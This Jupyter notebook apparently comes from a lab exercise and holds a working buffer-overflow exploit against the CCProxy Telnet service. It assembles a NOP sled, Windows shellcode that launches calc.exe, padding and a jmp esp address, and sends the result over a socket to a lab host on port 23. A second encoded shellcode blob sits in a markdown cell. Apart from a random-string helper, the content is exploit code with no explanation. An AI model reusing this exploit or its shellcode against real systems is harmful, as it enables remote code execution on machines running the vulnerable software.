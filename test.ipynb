{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'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'"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "def generate_random_str(randomlength=16):\n",
    "    \"\"\"\n",
    "    生成一个指定长度的随机字符串\n",
    "    \"\"\"\n",
    "    random_str = ''\n",
    "    base_str = 'ABCDEFGHIGKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789'\n",
    "    length = len(base_str) - 1\n",
    "    for i in range(randomlength):\n",
    "        random_str += base_str[random.randint(0, length)]\n",
    "    return random_str\n",
    "generate_random_str(2000)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'CCProxy Telnet>CCProxy Telnet Service Ready.\\r\\nCCProxy Telnet>'\n",
      "------------\n"
     ]
    }
   ],
   "source": [
    "bhead=b'\\x90'*4\n",
    "bshellcode= b'\\x89\\xe5\\x83\\xec\\x20\\x31\\xdb\\x64\\x8b\\x5b\\x30\\x8b\\x5b\\x0c\\x8b\\x5b\\x1c\\x8b\\x1b\\x8b\\x1b\\x8b\\x43\\x08\\x89\\x45\\xfc\\x8b\\x58\\x3c\\x01\\xc3\\x8b\\x5b\\x78\\x01\\xc3\\x8b\\x7b\\x20\\x01\\xc7\\x89\\x7d\\xf8\\x8b\\x4b\\x24\\x01\\xc1\\x89\\x4d\\xf4\\x8b\\x53\\x1c\\x01\\xc2\\x89\\x55\\xf0\\x8b\\x53\\x14\\x89\\x55\\xec\\xeb\\x32\\x31\\xc0\\x8b\\x55\\xec\\x8b\\x7d\\xf8\\x8b\\x75\\x18\\x31\\xc9\\xfc\\x8b\\x3c\\x87\\x03\\x7d\\xfc\\x66\\x83\\xc1\\x08\\xf3\\xa6\\x74\\x05\\x40\\x39\\xd0\\x72\\xe4\\x8b\\x4d\\xf4\\x8b\\x55\\xf0\\x66\\x8b\\x04\\x41\\x8b\\x04\\x82\\x03\\x45\\xfc\\xc3\\xba\\x78\\x78\\x65\\x63\\xc1\\xea\\x08\\x52\\x68\\x57\\x69\\x6e\\x45\\x89\\x65\\x18\\xe8\\xb8\\xff\\xff\\xff\\x31\\xc9\\x51\\x68\\x2e\\x65\\x78\\x65\\x68\\x63\\x61\\x6c\\x63\\x89\\xe3\\x41\\x51\\x53\\xff\\xd0\\x31\\xc9\\xb9\\x01\\x65\\x73\\x73\\xc1\\xe9\\x08\\x51\\x68\\x50\\x72\\x6f\\x63\\x68\\x45\\x78\\x69\\x74\\x89\\x65\\x18\\xe8\\x87\\xff\\xff\\xff\\x31\\xd2\\x52\\xff\\xd0'\n",
    "bjmpesp=b'\\x12\\x45\\xfa\\x7f'\n",
    "bfinal=b'p '+bhead+bshellcode+(1012-(len(bhead)+len(bshellcode)))*b'\\x90'+bjmpesp+b'\\r\\n'\n",
    "import socket\n",
    "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
    "s.connect(('192.168.56.101', 23))\n",
    "\n",
    "a=s.recv(2000)\n",
    "print(a)\n",
    "print(\"------------\")\n",
    "#s.send(b'p '+b'a'*2000+b'\\r\\n')\n",
    "s.send(bfinal+b'\\r\\n')\n",
    "a=s.recv(2000)\n",
    "#print(a)\n",
    "\n",
    "#a=s.recv(2000)\n",
    "#print(a)\n",
    "s.close()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "b'\\xeb\\x03\\x59\\xeb\\x05\\xe8\\xf8\\xff\\xff\\xff\\x4f\\x49\\x49\\x49\\x49\\x49\\x49\\x51\\x5a\\x56\\x54\\x58\\x36\\x33\\x30\\x56\\x58\\x34\\x41\\x30\\x42\\x36\\x48\\x48\\x30\\x42\\x33\\x30\\x42\\x43\\x56\\x58\\x32\\x42\\x44\\x42\\x48\\x34\\x41\\x32\\x41\\x44\\x30\\x41\\x44\\x54\\x42\\x44\\x51\\x42\\x30\\x41\\x44\\x41\\x56\\x58\\x34\\x5a\\x38\\x42\\x44\\x4a\\x4f\\x4d\\x4e\\x4f\\x4a\\x4e\\x46\\x54\\x42\\x50\\x42\\x50\\x42\\x30\\x4b\\x58\\x45\\x34\\x4e\\x33\\x4b\\x38\\x4e\\x37\\x45\\x30\\x4a\\x57\\x41\\x30\\x4f\\x4e\\x4b\\x48\\x4f\\x44\\x4a\\x31\\x4b\\x38\\x4f\\x45\\x42\\x52\\x41\\x30\\x4b\\x4e\\x49\\x54\\x4b\\x38\\x46\\x53\\x4b\\x48\\x41\\x30\\x50\\x4e\\x41\\x33\\x42\\x4c\\x49\\x59\\x4e\\x4a\\x46\\x38\\x42\\x4c\\x46\\x47\\x47\\x30\\x41\\x4c\\x4c\\x4c\\x4d\\x30\\x41\\x30\\x44\\x4c\\x4b\\x4e\\x46\\x4f\\x4b\\x53\\x46\\x45\\x46\\x32\\x46\\x50\\x45\\x37\\x45\\x4e\\x4b\\x48\\x4f\\x45\\x46\\x42\\x41\\x30\\x4b\\x4e\\x48\\x46\\x4b\\x38\\x4e\\x50\\x4b\\x44\\x4b\\x58\\x4f\\x45\\x4e\\x41\\x41\\x50\\x4b\\x4e\\x4b\\x48\\x4e\\x51\\x4b\\x38\\x41\\x50\\x4b\\x4e\\x49\\x48\\x4e\\x35\\x46\\x52\\x46\\x50\\x43\\x4c\\x41\\x33\\x42\\x4c\\x46\\x56\\x4b\\x38\\x42\\x34\\x42\\x53\\x45\\x38\\x42\\x4c\\x4a\\x37\\x4e\\x50\\x4b\\x38\\x42\\x54\\x4e\\x50\\x4b\\x48\\x42\\x37\\x4e\\x31\\x4d\\x4a\\x4b\\x48\\x4a\\x46\\x4a\\x50\\x4b\\x4e\\x49\\x30\\x4b\\x38\\x42\\x48\\x42\\x4b\\x42\\x30\\x42\\x30\\x42\\x30\\x4b\\x38\\x4a\\x36\\x4e\\x33\\x4f\\x55\\x41\\x53\\x48\\x4f\\x42\\x46\\x48\\x45\\x49\\x48\\x4a\\x4f\\x43\\x58\\x42\\x4c\\x4b\\x37\\x42\\x55\\x4a\\x56\\x42\\x4f\\x4c\\x58\\x46\\x30\\x4f\\x35\\x4a\\x46\\x4a\\x49\\x50\\x4f\\x4c\\x38\\x50\\x50\\x47\\x55\\x4f\\x4f\\x47\\x4e\\x43\\x56\\x41\\x46\\x4e\\x36\\x43\\x46\\x42\\x30\\x5a'dd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "1012"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(bhead+bshellcode+(1012-(len(bhead)+len(bshellcode)))*b'\\x90')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.8.9 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.9"
  },
  "vscode": {
   "interpreter": {
    "hash": "570feb405e2e27c949193ac68f46852414290d515b0ba6e5d90d076ed2284471"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
